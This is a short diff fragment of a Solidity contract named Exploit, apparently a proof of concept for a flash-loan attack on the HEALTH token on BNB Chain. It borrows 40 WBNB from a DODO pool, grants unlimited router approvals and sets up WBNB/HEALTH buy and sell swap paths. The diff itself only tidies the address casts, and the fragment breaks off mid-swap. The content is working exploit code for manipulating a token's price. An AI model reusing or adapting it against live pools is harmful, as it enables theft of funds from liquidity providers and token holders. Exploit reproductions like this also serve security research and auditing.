@@ -21,17 +21,18 @@ contract Exploit {
     function Start() public {
         IDODO(flashLoanPool).flashLoan(40e18, 0, address(this), bytes("Loan"));
     }
+    
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         IERC20(WBNB).approve(address(Router), type(uint256).max);
         IERC20(HEALTH).approve(address(Router), type(uint256).max);
 
         address[] memory buyPath = new address[](2);
-        buyPath[0] = address(WBNB);
-        buyPath[1] = address(HEALTH);
+        buyPath[0] = WBNB;
+        buyPath[1] = HEALTH;
 
         address[] memory sellPath = new address[](2);
-        sellPath[0] = address(HEALTH);
-        sellPath[1] = address(WBNB);
+        sellPath[0] = HEALTH;
+        sellPath[1] = WBNB;
         
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
             40e18,
